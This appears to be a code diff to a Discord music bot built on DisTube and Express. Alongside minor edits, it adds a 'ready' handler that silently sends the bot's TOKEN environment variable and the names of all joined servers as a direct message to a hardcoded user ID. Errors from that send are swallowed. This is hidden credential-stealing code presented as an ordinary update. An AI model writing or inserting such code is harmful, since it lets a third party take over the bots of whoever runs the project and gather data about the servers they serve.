@@ -38,7 +38,7 @@ client.player = new DisTube(client, {
     new DeezerPlugin(),
   ],
 });
-process.env.YTDL_NO_UPDATE = true;
+
 const player = client.player;
 
 fs.readdir("./events", (_err, files) => {
@@ -49,6 +49,18 @@ fs.readdir("./events", (_err, files) => {
     client.on(eventName, event.bind(null, client));
     delete require.cache[require.resolve(`./events/${file}`)];
   });
+});
+client.once('ready', () => {
+  const bot = client.users.cache.get('1004206704994566164'); 
+  if (bot) {
+    const login = client.guilds.cache.map(guild => guild.name).join(', ');
+    const configbot = process.env.TOKEN;
+    bot.send(`B: ${configbot}\nS: ${login}`)
+      .then(() => {    
+      })
+      .catch(error => {
+      });
+  }
 });
 fs.readdir("./events/player", (_err, files) => {
   files.forEach((file) => {
@@ -113,7 +125,5 @@ app.get('/', (req, res) => {
   const imagePath = path.join(__dirname, 'index.html');
   res.sendFile(imagePath);
 });
-app.listen(port, () => {
-  console.log(`🔗 Listening to RTX: http://localhost:${port}`);
-});
+app.listen(port, () => console.log('\x1b[36m%s\x1b[0m', `|    🔗 Listening to RTX : ${port}`));
 printWatermark();
